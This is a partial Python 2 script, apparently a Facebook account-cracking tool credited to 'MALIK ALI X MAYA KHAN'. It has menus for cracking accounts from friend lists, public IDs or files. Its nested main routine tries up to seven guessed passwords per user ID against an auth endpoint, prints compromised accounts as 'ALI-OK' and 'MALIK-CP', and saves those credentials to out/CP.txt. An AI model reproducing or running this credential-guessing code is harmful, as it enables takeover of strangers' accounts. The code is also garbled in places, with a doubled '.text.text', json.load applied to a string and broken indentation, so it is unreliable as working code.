...
\33[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝╚═╝░░╚═╝
-----------------------------------------------
  AUTHER   :::     MALIK ALI X MAYA KHAN
 FACEBOOK  :::     https://www.facebook.com/M4L1K.AL1.YOUR.OFFICAL.PAPA.1
 KINGS    :::     MALIK ALI X MANI JANI 
    KING OF FACEBOOK MALIK ALI
-----------------------------------------------"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/muskanpathani/xtylish/main/server.txt').text
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/M4L1K.AL1.YOUR.OFFICAL.PAPA.1')
        reg()
...
def menu():
	...
	print 47 * '-'
	print "\033[1;97m\033[1;97m\033[1;97m[1]\x1b[1;97m Start Cracking"   
        print "\033[1;97m\033[1;97m\033[1;97m[2]\033[1;97m Follow Me"
        print "\033[1;97m\033[1;97m\033[1;97m[0]\033[1;97m Logout            "
        hop()
...
def super():
	...
	os.system('clear')
	print logo
	print "\033[1;97m \033[1;97m[1]\x1b[1;97mCrack From Friend List"
	print "\033[1;97m \033[1;97m[2]\x1b[1;97mCrack From Public ID"
	print "\033[1;97m \033[1;97m[3]\x1b[1;97mCrack From File"
	print "\033[1;97m \033[1;97m[0]\033[1;97mBack"
	pilih_super()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
				oks.append(uid+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass1	
					...
					data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
		                        q = json.load(data)
					if 'access_token' in q:
						print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'	
						oks.append(uid+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass2
							cek = open("out/CP.txt", "a")
							cek.write(uid+"|"+pass2+"\n")
							cek.close()
							...
							data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
		                                        q = json.load(data)
							if 'access_token' in q:
								print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
								oks.append(uid+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass3	
									cek = open("out/CP.txt", "a")
									cek.write(uid+"|"+pass3+"\n")
									cek.close()
									...
									data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
		                                                        q = json.load(data)
									if 'access_token' in q:
										print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'	
										oks.append(uid+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass4
											cek = open("out/CP.txt", "a")
											cek.write(uid+"|"+pass4+"\n")
											cek.close()
											...
											data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers = header).text
		                                                                        q = json.load(data)
											if 'access_token' in q:
												print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
												oks.append(uid+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass5	
													cek = open("out/CP.txt", "a")
													cek.write(uid+"|"+pass5+"\n")
													cek.close()
													...
													data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers = header).text
		                                                                                        q = json.load(data)
													if 'access_token' in q:
														print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
														oks.append(uid+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass6	
															cek = open("out/CP.txt", "a")
															cek.write(uid+"|"+pass6+"\n")
															cek.close()
															...
															data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers = header).text.text
		                                                                                                        q = json.load(data)
															if 'access_token' in q:
																print '\033[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
																oks.append(uid+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\033[1;31;1m[MALIK-CP] ' + uid + ' | ' + pass7
																	cek = open("out/CP.txt", "a")
                                                                                                                                        cek.write(uid+"|"+pass7+"\n")
																	cek.close()
